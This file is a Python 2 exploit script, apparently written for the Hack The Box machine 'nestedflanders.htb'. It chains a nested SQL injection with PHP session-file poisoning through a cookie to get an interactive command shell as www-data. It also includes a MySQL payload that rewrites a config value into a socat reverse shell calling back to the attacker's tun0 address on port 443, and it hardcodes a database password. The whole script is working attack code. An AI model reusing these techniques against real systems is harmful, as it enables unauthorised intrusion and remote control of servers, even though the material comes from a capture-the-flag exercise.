#!/usr/bin/env python2

import requests
import netifaces

from os import system
from bs4 import BeautifulSoup as soup

requests.packages.urllib3.disable_warnings()

netifaces.ifaddresses("tun0")

IP = netifaces.ifaddresses("tun0")[netifaces.AF_INET][0]["addr"]
PORT = 443

endpoint = "https://www.nestedflanders.htb/index.php"

sql = "update config set option_value = 'socat tcp-connect:%s:%s exec:sh,pty,stderr,setsid,sigint,sane' where id = '86';" % (IP, PORT)

mysql_payload = 'mysql -D neddy -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e "%s"' % sql

mysql_check = 'mysql -D neddy -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e "select * from config where id like 86;"'

with requests.Session() as session:

    while True:
        command = raw_input("www-data#unattended> ") or "ls -la"

        if (command == "exit"):
            break
        else:
            if (command == "auto"):
                command = mysql_payload
            elif (command == "check"):
                command = mysql_check

            payload = dict(screwed="<?php system('" + command + "') ?>")

            session.get(endpoint, cookies=payload, verify=False)

            cookie = session.cookies.get_dict().get("PHPSESSID")

            session_path = "/var/lib/php/sessions/sess_%s" % cookie

            nested_injection = "465' union select " + '"' + "contact" + "'" + " union select " + "'" + session_path + "'" + " limit 1,1; -- -" + '"' + "; -- -"

            req = session.get(endpoint, params={"id": nested_injection}, verify=False)

            if (command == "ls"):
                finish = -7
            else:
                finish = -51

            print soup(req.text, "html.parser").get_text().strip("\n")[95:finish]
